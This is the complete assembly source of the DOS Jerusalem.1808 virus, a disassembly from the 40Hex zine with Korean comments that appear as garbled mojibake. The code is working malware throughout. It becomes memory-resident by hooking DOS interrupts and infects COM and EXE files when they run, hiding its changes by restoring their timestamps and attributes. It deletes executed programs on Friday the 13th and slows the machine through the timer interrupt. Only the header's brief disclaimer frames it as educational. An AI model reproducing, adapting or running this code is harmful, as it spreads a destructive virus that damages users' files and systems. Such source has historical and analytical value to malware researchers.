;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;     Jerusalem.1808.Standard                 \          \     \   \
;                                             \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #03
; Virus Name : Jerusalem.1808.Standard
; Author     : ?
; Origin     : Israel / Italia (?)
; Date       : 1998/02/05
; Disassmebly by Dark Angel
; Corean Edition : Nambeol
;
; Type : Memory resident  COM/EXE
;
; !****************************************************************************!
; *                                                                            *
; * ‰w‰¡ !                                                                     *
; *    ·¡ˆõ·e ¤a·¡œá¯a ­¡¯a Å¡—a·¡”a. Ša·B¸â·¥ ¡¢¸â·a¡ e ¬a¶w–A´á´¡Ðe”a.      *
; *    ¹A¸b¸a“e ·¡ ­¡¯aÅ¡—a¡ ´¡‹¡–A“e ´á˜áÐe ¢…¹AµA ”Ð¬á•¡ À‚·±·i »¡»¡ ´g   *
; *    “e”a. ¥eÑw Ðaˆáa ¯©Ð—Ða»¡  iœa !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify or execute it !                                       *
; *                                                                            *
; !****************************************************************************!
;
;  40Hex Number 13 Volume 4 Issue 1                                    File 008
;
;  ·¡ ¤a·¡œá¯a· ¸b•· ¶¥Ÿ¡Ÿi µÅ¥bÐa‰A ·¡Ð Ðe”a¡e ®ó‰A µž¬iQ ¥eÑw ¤a·¡œá¯aŸi
;  ¹A¸b Ði ® ·¶·i ˆõ·¡”a. 10 ‘e•¡ »¡e ¤a·¡œá¯a·±·i ‹¡´âÐaœa !
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

                .model  tiny
                .code
                org     0

; Jerusalem (Standard)
; Disassembly by Dark Angel of Phalcon/Skism
; Ðe‹i º¬â : Nambeol of CVL

viruslength     =       (endjerusalem - jerusalem) ; ¤a·¡œá¯a ‹©·¡
jerusalem:
                jmp     enter_jerusalem
                db      'sU'                    ; ¶¥œ sURiv 3 ·¡´ö”a‰¡ Ðe”a.
marker          db      'MsDos'                 ; ¤a·¡œá¯a ˆqµq µa¦ Îa¯¡
COMdest         dw      0, 0                    ;
activate_flag   db      0                       ; ÑÉ•· ¬wÈ
zero            dw      0                       ;
filesize        dw      3                       ; COM Ìa·© Ça‹¡
oldint8         dw      0, 0                    ; ¶¥œ ·¥ÈáœóËa 8h º­¡ˆt
oldint21        dw      0, 0                    ; ¶¥œ ·¥ÈáœóËa 21h º­¡ˆt
oldint24        dw      0, 0                    ; ¶¥œ ·¥ÈáœóËa 24h º­¡ˆt
int8counter     dw      0                       ; »w¬w Äa¶…Èá
tempheader      dw      0
EXEdest         dw      0,0                     ;
_initialSP      dw      0                       ;
_initialSS      dw      0                       ;
_headersize     dw      0                       ;
_filelengthlo   dw      0                       ;
_filelengthhi   dw      0                       ;
savePSP1        dw      0                       ; PSP ˆt
respara         dw      80h                     ; ¯©Ð—·i ¶áÐe ÑÅ‰w •A·¡Èá µwµb

parmblock:
                dw      0 ; use current environment
                dw      80h
savePSP2        dw      0 ; pointer to command line
                dw      5Ch
savePSP3        dw      0 ; pointer to 1st FCB
                dw      6Ch
savePSP4        dw      0 ; pointer to 2nd FCB
saveSP          dw      0                       ; SP
saveSS          dw      0                       ; SS
initialCSIP     dw      0, 0                    ; CS,IP

oldintFF        dw      0                       ; ¶¥œ Int FFh ¶w
                db      0
COM_EXE_flag    db      0
header          dw      0Eh dup (0)
readbuffer      db      5 dup (0)               ; ˆqµqµa¦Ÿi ÑÂ·¥ ¶áÐe ¤áÌá
filehandle      dw      0                       ; Ìa·© Ð…—i
fileattr        dw      0                       ; Ìa·© ­¢¬÷
filedate        dw      0                       ; Ìa·© i¼a
filetime        dw      0                       ; Ìa·© ¯¡ˆe
pagesize        dw      200h                    ; 512 (ÍA·¡»¡ Ça‹¡)
parasize        dw      10h                     ; paragraph->byte conversion
filelength      dw      0, 0                    ; Ìa·© ‹©·¡
filenameptr     dw      0, 0                    ; Ìa·©·¡Ÿq
command_com     db      'COMMAND.COM'           ; ˆqµq ¹A¶A Ìa·©
alloc_flag      dw      0                       ; ¡A¡¡Ÿ¡ Ði”w µa¦ Ïiœ‹a
                db      0, 0, 0, 0

enter_jerusalem:
                cld
                mov     ah,0E0h                 ;
                int     21h                     ; ¬wº µa¦ ˆñ¬a
                cmp     ah,0E0h
                jae     not_resident
                cmp     ah,3                    ; AH ˆa 3 ·¡¡e ¬wºÐ·¶”a.
                jb      not_resident

                mov     ah,0DDh                 ; COM ¯©Ð—
                mov     di,100h                 ; DI= 100h
                mov     si,offset endjerusalem  ; SI= ¶¥œ Ïa¡‹aœ‘ ¯¡¸b¸ñ
                add     si,di                   ;     (Ìa·©‹©·¡ + 100h)
                mov     cx,cs:[di+filesize]     ; CX= ¶¥œ Ïa¡‹aœ‘ ‹©·¡
                int     21h                     ; ¸¤Ã¡ ¯©Ð—
not_resident:
                mov     ax,cs                   ;
                add     ax,10h                  ; EXE ­A‹a åËa É··©Ð¬á ¸ñÏa
                mov     ss,ax                   ;
                mov     sp,700h                 ;
                push    ax
                mov     ax,offset relocate_entry
                push    ax
                retf

;
; ·¡ ¤a·¡œá¯a“e 0 ¤å»¡µA¬á ¯©Ð—–A•¡¢ ¹A¸b–A´ö”a. Ða»¡ e, COM Ìa·©·e 100h µA¬á
; ¯©Ð—–A£a¡ ­A‹a åËaŸi + 10h Ðº¡¬á COM Ìa·©•¡ 0 ¤å»¡µA¬á ¯©Ð—–A“e ˆõ Àáœñ  e
; –‰ ¯A ·¶”a.
; 0000:0100h µÁ 0010:0000h “e ¸é”º­¡µA¬á ˆ{·q·i ¬—ˆbÐa‹¡ ¤aœe”a. ·¡Ðˆa ´e–A
; ¡e —¡¤áˆá¡ »¢¸ó ¯©ÐñÐ ¥¡‹¡ ¤aœe”a.
;
relocate_entry:                                 ; EXE Ìa·© ¯¡¸b¸ñ
                cld
                push    es
                mov     cs:savePSP1,es          ;
                mov     cs:savePSP2,es          ; PSP ¸á¸w
                mov     cs:savePSP3,es          ;
                mov     cs:savePSP4,es          ;
                mov     ax,es
                add     ax,10h                  ;
                add     cs:initialCSIP+2,ax     ;
                add     cs:saveSS,ax
                mov     ah,0E0h                 ; ¬wº µa¦ ˆñ¬a
                int     21h
                cmp     ah,0E0h
                jae     install_virus
                cmp     ah,3
                pop     es
                mov     ss,cs:saveSS            ; ¶¥œ EXE Ïa¡‹aœ‘ ¯©Ð—
                mov     sp,cs:saveSP
                jmp     dword ptr cs:initialCSIP
install_virus:
                xor     ax,ax                   ;
                mov     es,ax                   ; ·¥ÈáœóËa FFh · ˆtµA
                mov     ax,es:0FFh*4            ; rep movsw / retf Ÿi ¸á¸wÐe”a.
                mov     cs:oldintFF,ax          ;
                mov     al,es:0FFh*4+2          ;
                mov     byte ptr cs:oldintFF+2,al
                mov     word ptr es:0FFh*4,0A5F3h ; rep movsw
                mov     byte ptr es:0FFh*4+2,0CBh ; retf
                pop     ax                      ; COM Ìa·©· ‰w¶ ‹a ¡A¡¡Ÿ¡ ‹a
                add     ax,10h                  ; ”¡ ¸¤Ã¡–E”a.
                mov     es,ax
                push    cs
                pop     ds
                mov     cx,viruslength          ; ¤a·¡œá¯a ‹©·¡
                shr     cx,1                    ; ¤a·¡œá¯a ‹©·¡ / 2
                xor     si,si
                mov     di,si
                push    es
                mov     ax,offset return_here
                push    ax
                db      0EAh                    ; jmp far ptr
                dw      03FCh, 0                ; JMP 0000:03FCh
return_here:
                mov     ax,cs                   ; ¥¢¬a {eÒ ·¡½¢·a¡ ¸ñÏaÐe”a.
                mov     ss,ax
                mov     sp,700h                 ; ¯aÈ‚ ¹¡¸÷
                xor     ax,ax
                mov     ds,ax
                mov     ax,cs:oldintFF          ; Int FFh ¥¢Š
                mov     ds:0FFh*4,ax
                mov     al,byte ptr cs:oldintFF+2
                mov     ds:0FFh*4+2,al
                mov     bx,sp                   ; ¡A¡¡Ÿ¡ Ði”w
                mov     cl,4                    ; SP(700) / 2 ^ 4 = Ìœá‹aœÏ¡
                shr     bx,cl                   ; ”e¶á
                add     bx,10h                  ; 10h “e PSP Ça‹¡ ·¡”a. 256 byte
                mov     cs:respara,bx           ;
                mov     ah,4Ah                  ; ¤a·¡œá¯aˆa Ï©¶aÐe  eÇq e ¡A¡¡
                mov     es,cs:savePSP1          ; Ÿ¡Ÿi º‰·¥”a.
                int     21h                     ;
;
; ¡A¡¡Ÿ¡ Ði”w ¦¦…·¡ ·¡Ðˆa ¸i ´e–A¡e ‰Åe ¬á¸â·a¡ ‰·¦Ÿi ”áÐa‹¡ ¤aœe”a.
;
                mov     ax,3521h                ; ·¥ÈáœóËa 21h º­¡ ´è‹¡
                int     21h                     ;
                mov     cs:oldint21,bx          ; ¸á¸w
                mov     word ptr cs:oldint21+2,es

                push    cs                      ; ¤a·¡œá¯aˆa ˆa»¡“e ·¥ÈáœóËa
                pop     ds                      ; 21h Ð…—iœá¡ ¤aŽ…”a.
                mov     dx,offset int21
                mov     ax,2521h
                int     21h

                mov     es,savePSP1             ; PSP ¸á¸w
                mov     es,es:2Ch               ; ÑÅ‰wµwµb ­A‹a åËaŸi ´è“e”a.
                xor     di,di                   ; PSP:002Ch µA º­¡ˆa —i´á ·¶
                mov     cx,7FFFh                ; ”a.
                xor     al,al                   ;
scan_environment:                               ; ÑÅ‰wµwµb ¤Ã¡ µb¯¡ ¬á¸â·i
                repne   scasb                   ; Àq‰¡ Ða‹¡ ¤aœe”a.
                cmp     es:[di],al              ;
                loopnz  scan_environment        ;

                mov     dx,di                   ;
                add     dx,3                    ; ¯©Ð—Ði Ìa·©·¡Ÿq·i ´è“e”a. ÑÅ
                mov     ax,4B00h                ; ‰wµwµbµA ·¶”a.
                push    es
                pop     ds
                push    cs
                pop     es
                mov     bx,offset parmblock
                push    ds
                push    es
                push    ax
                push    bx
                push    cx
                push    dx
                mov     ah,2Ah                  ; i¼a ´è‹¡
                int     21h

                mov     cs:activate_flag,0      ;
                cmp     cx,1987d                ; 1987 ‘eµA“e ¸b•·´eÐe”a.
                je      no_activate
                cmp     al,5                    ; ‹q¶a·©·¥ˆa ?
                jne     set_int8
                cmp     dl,13d                  ; 13 ·© ·¥ˆa ?
                jne     set_int8
                inc     cs:activate_flag        ; ‹aœá¡e ¸b•·Ðe”a.
                jmp     short no_activate
                db      90h
set_int8:                                       ; Int 8h Ÿi ¸á¸wÐe”a.
                mov     ax,3508h                ;
                int     21h
                mov     cs:oldint8,bx
                mov     word ptr cs:oldint8+2,es

                push    cs
                pop     ds                      ;
                mov     int8counter,60*30*18    ; ¯¡ˆe ¬é¸÷ (30¦…Ò)
                mov     ax,2508h                ;
                mov     dx,offset int8
                int     21h
no_activate:
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                pop     es
                pop     ds
                pushf
                call    dword ptr cs:oldint21   ; ¶¥œ Ïa¡‹aœ‘ ¯©Ð—
                push    ds
                pop     es
                mov     ah,49h                  ; ¡A¡¡Ÿ¡ Ð¹A
                int     21h

                mov     ah,4Dh                  ; µAœáˆt ´è‹¡
                int     21h

                mov     ah,31h                  ; ¶¥œ Ïa¡‹aœ‘ ¯©Ð—Ò ‹¡´â¸w­¡
                mov     dx,600h                 ; µA ¤a·¡œá¯a ¬wºÐq
                mov     cl,4
                shr     dx,cl
                add     dx,10h
                int     21h

int24:
                xor     al,al
                iret

int8:
                cmp     cs:int8counter,2        ; ********************
                jne     no_box                  ;       Int 8h
                push    ax                      ; ********************
                push    bx                      ;
                push    cx
                push    dx
                push    bp
                mov     ax,602h                 ; scroll up 2 lines
                mov     bh,87h                  ; (5,5) - (10,10)
                mov     cx,505h
                mov     dx,1010h
                int     10h                     ; ¯aÇa© Òa‰Á

                pop     bp
                pop     dx
                pop     cx
                pop     bx
                pop     ax
no_box:
                dec     cs:int8counter
                jnz     exitint8
                mov     cs:int8counter,1
                push    ax
                push    cx
                push    si
                mov     cx,4001h                ; »¡µe¯¡Ç¡‹¡
                rep     lodsb
                pop     si
                pop     cx
                pop     ax
exitint8:
                jmp     dword ptr cs:oldint8    ; ¶¥œ ·¥ÈáœóËa 8 ®Ð—

int21:
                pushf
                cmp     ah,0E0h                 ; ¬wº µa¦ ˆñ¬a ·¥ˆa ?
                jne     not_install
                mov     ax,300h                 ; ¬wºˆt Ÿ¡Èå
                popf
                iret
not_install:
                cmp     ah,0DDh                 ; COM ¸¤Ã¡
                je      restore_COM
                cmp     ah,0DEh                 ; EXE ¸¤Ã¡ (¯©¹A¡“e ¬a¶w´e–E
                je      restore_EXE             ; ”a.)
                cmp     ax,4B00h                ; ¯©Ð—·¥ˆa ?
                jne     exitint21
                jmp     execute
exitint21:
                popf
                jmp     dword ptr cs:oldint21
restore_COM:                                    ; ¶¥œ COM ¡A¡¡Ÿ¡µA ¸¤Ã¡
                pop     ax                      ; pushf Ð–”å ˆt
;
; ·¥ÈáœóËaˆa Ñ¡Â‰–A¡e Ïiœ‹a,CS,IP  ®…·a¡ ¸á¸w–E”a. µa‹¡¬á ¶¥œ ·¥ÈáœóËaˆa Ñ¡
; Â‰–E ‰µ·i ´i‹¡ ¶áÐ¬á“e CS ˆt e ´i¡e–E”a.
;
                pop     ax                      ; IP ˆt
                mov     ax,100h                 ;
                mov     cs:COMdest,ax           ;
                pop     ax                      ; Ïa¡‹aœ‘ CS ´è‹¡
                mov     word ptr cs:COMdest+2,ax
                rep     movsb                   ; ¸¤Ã¡
                popf                            ;
                mov     ax,cs:zero              ; clear AX
                jmp     dword ptr cs:COMdest    ; ¶¥œ Ïa¡‹aœ‘·a¡ ¸ñÏa
                                                ; CS:100h ¡ ¸ñÏaÐe”a.
restore_EXE:
                add     sp,6                    ; EXE ¸¤Ã¡
                popf                            ; ¤a·¡œá¯a ¹A¸b¸a· ·•¡“e
                mov     ax,cs                   ; EXE Ìa·©•¡ ´|¦¦…µA ¤a·¡œá¯a
                mov     ss,ax                   ; Ÿi ¤Ã¡Ðaa‰¡ Ðeˆõ ˆ{”a. Ða»¡
                mov     sp,offset endjerusalem  ;  e ·¡ žË¥·e ¬a¶w–A»¡ ´g“e”a.
                push    es                      ; ·¡ žË¥·e Ï©¶a ´ô”a.
                push    es
                xor     di,di
                push    cs
                pop     es
                mov     cx,10h
                mov     si,bx
                mov     di,offset tempheader
                rep     movsb
                mov     ax,ds
                mov     es,ax
                mul     cs:parasize             ; convert to bytes
                add     ax,cs:_headersize
                adc     dx,0
                div     cs:parasize             ; convert to paragraphs
                mov     ds,ax
                mov     si,dx
                mov     di,dx
                mov     bp,es
                mov     bx,cs:_filelengthhi
                or      bx,bx
                jz      no_move_code
move_code:
                mov     cx,8000h
                rep     movsw
                add     ax,1000h
                add     bp,1000h
                mov     ds,ax
                mov     es,bp
                dec     bx
                jnz     move_code
no_move_code:
                mov     cx,cs:_filelengthlo
                rep     movsb
                pop     ax
                push    ax
                add     ax,10h
                add     cs:_initialSS,ax
                add     word ptr cs:EXEdest+2,ax
                mov     ax,cs:tempheader
                pop     ds
                pop     es
                mov     ss,cs:_initialSS
                mov     sp,cs:_initialSP
                jmp     dword ptr cs:EXEdest

delete_file:
                xor     cx,cx                   ; ·ª‹¡/³a‹¡¡ ­¢¬÷ ¥e‰w
                mov     ax,4301h
                int     21h

                mov     ah,41h                  ; Ìa·© ¬b¹A
                int     21h

                mov     ax,4B00h                ; Ïa¡‹aœ‘ ¯©Ð—
                popf                            ; ”wµeÓ¡ Ìa·©·¡ ´ô·a£a¡ µ¡ŸA
                jmp     dword ptr cs:oldint21   ; ¤i¬—

execute:
                cmp     cs:activate_flag,1      ; 13·©· ‹q¶a·© ·¥ˆa ?
                je      delete_file
                mov     cs:filehandle,0FFFFh    ; Ìa·© Ð…—i¸á¸w (Ìa·©·¡ µ¡Ïe–A¡e
                                                ; ¸÷¬w·¡¡e Ìa·© Ð…—i·¡ ¸á¸w–E”a)
                mov     cs:alloc_flag,0         ;
                mov     cs:filenameptr,dx       ; Ìa·© ·¡Ÿq
                mov     word ptr cs:filenameptr+2,ds ; DS:DX
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                push    es
                cld
                mov     di,dx
                xor     dl,dl
                cmp     byte ptr [di+1],':'     ; —aœa·¡§a ·¥ˆa ?
                jne     execute_nodrive
                mov     dl,[di]                 ; —aœa·¡§a ´è‹¡
                and     dl,1Fh                  ; ¢…¸aŸi ®•¸a¡ ¤aŽ‘
execute_nodrive:
                mov     ah,36h                  ; §¥¶wœ··¡ ´é a·¥ˆa ?
                int     21h
                cmp     ax,0FFFFh               ; µAœá·¥ˆa ?
                jne     check_drivespace
go_exit_execute:
                jmp     exit_execute
check_drivespace:
                mul     bx                      ; ax = clus/sec, bx=free clus
                mul     cx                      ; cx = bytes/sector
                or      dx,dx                   ; check if enough free space
                jnz     enough_space            ; ¤a·¡œá¯a ‹©·¡ ·¡¬w· §¥‰·ˆe·¡
                cmp     ax,viruslength          ; ·¶“eˆa ?
                jb      go_exit_execute
enough_space:
                mov     dx,cs:filenameptr       ;
                push    ds
                pop     es
                xor     al,al                   ;
                mov     cx,41h
                repne   scasb
                mov     si,cs:filenameptr
uppercase_loop:
                mov     al,[si]                 ;
                or      al,al                   ; Ìa·© ·¡Ÿq {·¥ˆa ?
                jz      uppercase_loop_done
                cmp     al,'a'                  ;
                jb      not_lower               ; ­¡¢…¸aŸi ”¢…¸a¡ ¤aŽ…”a.
                cmp     al,'z'                  ;
                ja      not_lower               ;
                sub     byte ptr [si],' '       ; - 20h (”¢…¸aµÁ ­¡¢…¸a“e
                                                ;        20h · Àa·¡ˆa ·¶”a.)
not_lower:
                inc     si
                jmp     short uppercase_loop
uppercase_loop_done:
                mov     cx,0Bh                  ; Ìa·© ·¡Ÿq·¡ COMMAND.COM
                sub     si,cx                   ; ·¥ˆa ?
                mov     di,offset command_com
                push    cs
                pop     es
                mov     cx,0Bh
                repe    cmpsb
                jnz     not_command_com
                jmp     exit_execute
not_command_com:
                mov     ax,4300h                ; ­¢¬÷ ´è‹¡
                int     21h
                jc      error1
                mov     cs:fileattr,cx
error1:
                jc      error2
                xor     al,al
                mov     cs:COM_EXE_flag,al      ;
                push    ds
                pop     es
                mov     di,dx
                mov     cx,41h
                repne   scasb                   ; COM ·¥»¡ ˆñ¬aÐe”a. ·¡£¡ ”¢…
                cmp     byte ptr [di-2],'M'     ; ¸a¡ ¥eÑÅ–A´ö·a£a¡ ­¡¢…¸a ˆñ
                je      EXEidentified           ; ¬a“e Ï©¶a ´ô·a¡a ”e®…Ó¡ ÑÂ¸w
                cmp     byte ptr [di-2],'m'     ; ¸a  e·a¡ ˆñ¬a Ða£a¡ ¢…¹Aˆa
                je      EXEidentified           ; ·¶”a.
                inc     cs:COM_EXE_flag         ; EXE Ìa·©·¡£a¡ »wˆa
EXEidentified:
                mov     ax,3D00h                ; Ìa·© µ¡Ïe
                int     21h
error2:
                jc      error3
                mov     cs:filehandle,ax
                mov     bx,ax
                mov     ax,4202h                ; Ìa·©{ - 5 ¡ ·¡•·
                mov     cx,0FFFFh
                mov     dx,0FFFBh
                int     21h
                jc      error2

                add     ax,5                    ; +5 Ð¬á Ìa·© ‹©·¡ ´è·q
                mov     cs:filesize,ax
                mov     cx,5                    ; 5 ¤a·¡Ëa ·ª‹¡
                mov     dx,offset readbuffer
                mov     ax,cs
                mov     ds,ax
                mov     es,ax
                mov     ah,3Fh
                int     21h

                mov     di,dx                   ; MsDos ·¥ˆa ?
                mov     si,offset marker        ; EXE Ìa·©µA ˆqµq–I˜ MsDos Ÿi
                repe    cmpsb                   ; ¸á¸wÐa»¡ ´g´a º—¥¢ˆqµq–E”a.
                jnz     not_infected            ;
                mov     ah,3Eh                  ; Ìa·© ”h‹¡
                int     21h

                jmp     exit_execute
not_infected:
                mov     ax,3524h                ; ·¥ÈáœóËa 24h º­¡ ´è‹¡
                int     21h
                mov     oldint24,bx             ; ¸á¸w
                mov     word ptr oldint24+2,es

                mov     dx,offset int24         ; ¬¡¶… Int 24h ¡ ¤aŽ‘
                mov     ax,2524h
                int     21h

                lds     dx,dword ptr filenameptr; ¤a·¡œá¯a ·¡Ÿq ´è‹¡
                xor     cx,cx                   ; ­¢¬÷·i ·ª‹¡/³a‹¡¡ ¤aŽ‘
                mov     ax,4301h
                int     21h
error3:
                jc      error4
                mov     bx,cs:filehandle
                mov     ah,3Eh                  ; Ìa·© ”h‹¡
                int     21h

                mov     cs:filehandle,0FFFFh    ; µAœá¯¡ FFFFh ˆa —i´á·¶”a.
                mov     ax,3D02h                ; ·ª‹¡/³a‹¡¡ Ìa·© µ¡Ïe
                int     21h                     ; ¸÷¬w µ¡Ïe·¡¡e AX µA Ìa·©Ð…—i
                jc      error4                  ; ·¡ •©´aµ¥”a.

                mov     cs:filehandle,ax        ; Ð…—i ¸á¸w
                mov     ax,cs
                mov     ds,ax
                mov     es,ax
                mov     bx,filehandle
                mov     ax,5700h                ; Ìa·©· ¸b¬÷·©/¯¡ˆe ´è‹¡
                int     21h
                mov     filedate,dx             ; ¸á¸w
                mov     filetime,cx

                mov     ax,4200h                ; Ìa·© Àá·q·a¡ ·¡•·
                xor     cx,cx
                mov     dx,cx
                int     21h
error4:
                jc      error5
                cmp     COM_EXE_flag,0          ; COM ·¥ˆa ?
                je      infect_com
                jmp     short infect_exe
                db      90h
infect_com:                                     ; COM ˆqµqžË¥
                mov     bx,1000h                ; ¡A¡¡Ÿ¡ ´è‹¡ (64KB)
                mov     ah,48h
                int     21h
                jnc     allocation_fine

                mov     ah,3Eh                  ; µAœá¡e Ìa·© ”h‹¡
                mov     bx,filehandle
                int     21h

                jmp     exit_execute
allocation_fine:
                inc     alloc_flag
                mov     es,ax                   ; ¬ ¤áÌáµA ¤a·¡œá¯a ¥¢¬a
                xor     si,si
                mov     di,si
                mov     cx,viruslength
                rep     movsb
                mov     dx,di
                mov     cx,filesize             ; ¶¥œ COM Ça‹¡  eÇq Ìa·© ·ª´á
                mov     bx,filehandle           ; —i·¡‹¡
                push    es
                pop     ds
                mov     ah,3Fh                  ;
                int     21h
error5:
                jc      error6
                add     di,cx
                xor     cx,cx                   ; Ìa·© ¯¡¸b·a¡ ·¡•·
                mov     dx,cx
                mov     ax,4200h
                int     21h

                mov     si,offset marker        ; Ìa·© {µA ¤a·¡œá¯a ¯¢¥i¸aý‹¡
                mov     cx,5
                rep     movs byte ptr es:[di],cs:[si]
                mov     cx,di                   ;
                xor     dx,dx
                mov     ah,40h
                int     21h
error6:
                jc      error7
                jmp     error12
infect_exe:
                mov     cx,1Ch                  ; EXE ÑA”á ·ª‹¡
                mov     dx,offset header
                mov     ah,3Fh
                int     21h
error7:
                jc      error8
                mov     word ptr ds:header+12h,1984h ; ???
                mov     ax,ds:header+0eh; initial SS
                mov     ds:saveSS,ax
                mov     ax,ds:header+10h        ; initial SP
                mov     ds:saveSP,ax
                mov     ax,ds:header+14h
                mov     ds:initialCSIP,ax
                mov     ax,ds:header+16h
                mov     ds:initialCSIP+2,ax
                mov     ax,ds:header+4          ;
                cmp     word ptr ds:header+2,0  ;
                je      not_rounded
                dec     ax                      ;
not_rounded:
                mul     word ptr ds:pagesize
                add     ax,ds:header+2
                adc     dx,0                    ; Ìa·© Ça‹¡ ´è‹¡
                add     ax,0Fh                  ; 16 · ¤®¡  e—e”a.
                adc     dx,0
                and     ax,0FFF0h               ;
                mov     ds:filelength,ax
                mov     ds:filelength+2,dx
                add     ax,viruslength          ; + ¤a·¡œá¯a ‹©·¡
                adc     dx,0
error8:
                jc      error9
                div     word ptr ds:pagesize    ; ÍA·¡»¡ Ça‹¡¡ a’…”a.
                or      dx,dx                   ; a á»¡ˆa ¹¥¸Ðaa ?
                jz      dont_round
                inc     ax
dont_round:
                mov     ds:header+4,ax          ; ¬ Ð”á ³a‹¡
                mov     ds:header+2,dx
                mov     ax,ds:filelength        ; convert filesize
                mov     dx,ds:filelength+2
                div     word ptr ds:parasize    ; to paragraphs
                sub     ax,ds:header+8          ; subtract header size
                mov     ds:header+16h,ax        ; insert as initial CS
                mov     word ptr ds:header+14h,offset relocate_entry
                mov     ds:header+0eh,ax        ; insert new stack segment
                mov     word ptr ds:header+10h,offset endjerusalem; & pointer

                xor     cx,cx                   ; Ìa·© ¯¡¸b·a¡ ·¡•·
                mov     dx,cx
                mov     ax,4200h
                int     21h
error9:
                jc      error10
                mov     cx,1Ch                  ; ¤aŽå ÑA”á ³a‹¡
                mov     dx,offset header
                mov     ah,40h
                int     21h
error10:
                jc      error11
                cmp     ax,cx
                jne     error12

                mov     dx,ds:filelength        ; Ìa·© {·a¡ ·¡•·
                mov     cx,ds:filelength+2
                mov     ax,4200h
                int     21h
error11:
                jc      error12
                xor     dx,dx                   ; ¤a·¡œá¯a ³a‹¡
                mov     cx,viruslength
                mov     ah,40h
                int     21h
error12:
                cmp     cs:alloc_flag,0         ; ¡A¡¡Ÿ¡Ÿi Ði”w Ð–´öa ?
                je      no_free                 ;
                mov     ah,49h                  ; ¡A¡¡Ÿ¡ Ð¹A
                int     21h
no_free:
                cmp     cs:filehandle,0FFFFh    ; µAœá ·¥ˆa ? (Ìa·©·¡ µ¡Ïe–A»¡
                je      exit_execute            ; ´g´v”a.)
                mov     bx,cs:filehandle        ; Ìa·©¸b¬÷ i¼a/¯¡ˆe ´è‹¡
                mov     dx,cs:filedate
                mov     cx,cs:filetime
                mov     ax,5701h
                int     21h

                mov     ah,3Eh                  ; Ìa·© ”h‹¡
                int     21h

                lds     dx,dword ptr cs:filenameptr
                mov     cx,cs:fileattr
                mov     ax,4301h                ; ­¢¬÷ ¥¢Š
                int     21h

                lds     dx,dword ptr cs:oldint24; Int 24h ¥¢Š
                mov     ax,2524h
                int     21h
exit_execute:
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf
                jmp     dword ptr cs:oldint21
; slack space for stack here                    ; ¯aÈ‚
                org     710h
endjerusalem:
                nop
                int     20h                     ; ¶¥œ Ïa¡‹aœ‘ (3 ¤a·¡Ëa)
                db      'MsDos'                 ; ¤a·¡œá¯a ˆqµqÎa¯¡

                end     jerusalem

